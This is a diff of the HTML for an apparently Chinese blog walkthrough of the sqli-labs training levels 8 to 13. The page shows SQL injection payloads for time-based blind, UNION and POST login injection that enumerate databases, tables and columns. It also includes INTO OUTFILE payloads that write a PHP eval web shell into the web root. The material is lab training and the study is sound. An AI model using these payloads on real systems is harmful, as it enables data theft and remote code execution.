 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://localhost/sqli-labs/Less-8/?id=-1&amp;#39; UNION SELECT 1,2,0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e into outfile &amp;#39;C:\\phpstudy_pro\\WWW\\hack.php&amp;#39; --+
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317132457.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250317132457&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317132457.png&#34; alt=&#34;Pasted image 20250317132457&#34;&gt;&lt;br&gt;
 链接成功。&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317132622.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250317132622&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h1 id=&#34;less-9&#34;&gt;Less-9
-&lt;/h1&gt;&lt;p&gt;基于GET单引号基于时间盲注&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317132622.png&#34; alt=&#34;Pasted image 20250317132622&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;less-9&#34;&gt;Less-9&lt;/h1&gt;
+&lt;p&gt;基于GET单引号基于时间盲注&lt;br&gt;
 如果当前数据库名字符长度大于1，则执行sleep函数使数据库执行延迟，否则则返回1。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -921,18 +567,9 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;延迟5秒
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317140308.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250317140308&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h1 id=&#34;less-10&#34;&gt;Less-10
-&lt;/h1&gt;&lt;p&gt;基于GET双引号基于时间盲注&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317140308.png&#34; alt=&#34;Pasted image 20250317140308&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;less-10&#34;&gt;Less-10&lt;/h1&gt;
+&lt;p&gt;基于GET双引号基于时间盲注&lt;br&gt;
 与第9关差不多，只不过闭合方式变成双引号了&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -944,18 +581,9 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;延迟5秒
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317140607.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250317140607&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h1 id=&#34;less-11&#34;&gt;Less-11
-&lt;/h1&gt;&lt;p&gt;基于单引号的POST注入&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317140607.png&#34; alt=&#34;Pasted image 20250317140607&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;less-11&#34;&gt;Less-11&lt;/h1&gt;
+&lt;p&gt;基于单引号的POST注入&lt;br&gt;
 &lt;strong&gt;单引号测试：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -965,16 +593,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;uname&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;--+&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;submit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Submit&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317144342.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250317144342&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317144342.png&#34; alt=&#34;Pasted image 20250317144342&#34;&gt;&lt;br&gt;
 &lt;strong&gt;字段个数：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -988,16 +607,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;说明有两个字段&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317144707.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250317144707&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317144707.png&#34; alt=&#34;Pasted image 20250317144707&#34;&gt;&lt;br&gt;
 &lt;strong&gt;查找回显位：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1007,16 +617,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;uname&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;submit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Submit&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145213.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250317145213&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145213.png&#34; alt=&#34;Pasted image 20250317145213&#34;&gt;&lt;br&gt;
 &lt;strong&gt;爆库名：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1026,16 +627,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;uname&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;submit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Submit&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145013.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250317145013&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145013.png&#34; alt=&#34;Pasted image 20250317145013&#34;&gt;&lt;br&gt;
 &lt;strong&gt;爆表名：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1045,16 +637,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;uname&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;group_concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;submit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Submit&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145312.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250317145312&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145312.png&#34; alt=&#34;Pasted image 20250317145312&#34;&gt;&lt;br&gt;
 &lt;strong&gt;爆列名：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1064,16 +647,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;uname&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&amp;#39;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;emails&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;submit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Submit&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145416.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250317145416&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145416.png&#34; alt=&#34;Pasted image 20250317145416&#34;&gt;&lt;br&gt;
 &lt;strong&gt;爆信息：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1083,16 +657,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;uname&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select 1,group_concat(concat_ws(&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;email_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;emails&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;submit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Submit&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145535.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250317145535&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145535.png&#34; alt=&#34;Pasted image 20250317145535&#34;&gt;&lt;br&gt;
 &lt;strong&gt;写shell：&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1102,29 +667,11 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;uname&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; UNION SELECT 1,&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;v&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39; into outfile &amp;#34;D:\\phpStudy_pro\\WWW\\hack1.php&amp;#34; %23 &amp;amp;passwd=&amp;amp;submit=Submit
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145849.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250317145849&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145849.png&#34; alt=&#34;Pasted image 20250317145849&#34;&gt;&lt;br&gt;
 &lt;strong&gt;成功连接&lt;/strong&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145917.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250317145917&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h1 id=&#34;less-12&#34;&gt;Less-12
-&lt;/h1&gt;&lt;p&gt;跟11关差不多，但是使用的是&lt;strong&gt;双引号加括号&lt;/strong&gt;进行闭合。&lt;/p&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317145917.png&#34; alt=&#34;Pasted image 20250317145917&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;less-12&#34;&gt;Less-12&lt;/h1&gt;
+&lt;p&gt;跟11关差不多，但是使用的是&lt;strong&gt;双引号加括号&lt;/strong&gt;进行闭合。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -1133,19 +680,10 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;uname=admin&amp;#34;) order by 2 --+&amp;amp;passwd=&amp;amp;submit=Submit
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317151040.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250317151040&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317151040.png&#34; alt=&#34;Pasted image 20250317151040&#34;&gt;&lt;br&gt;
 然后后面跟11关一样。&lt;/p&gt;
-&lt;h1 id=&#34;less-13&#34;&gt;Less-13
-&lt;/h1&gt;&lt;p&gt;基于&lt;strong&gt;单引号加括号&lt;/strong&gt;进行闭合，错误回显注入。和十二关一样。&lt;br&gt;
+&lt;h1 id=&#34;less-13&#34;&gt;Less-13&lt;/h1&gt;
+&lt;p&gt;基于&lt;strong&gt;单引号加括号&lt;/strong&gt;进行闭合，错误回显注入。和十二关一样。&lt;br&gt;
 构建payload:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1155,16 +693,7 @@ php的配置文件php.ini关闭魔术引号&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;uname&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;submit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Submit&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
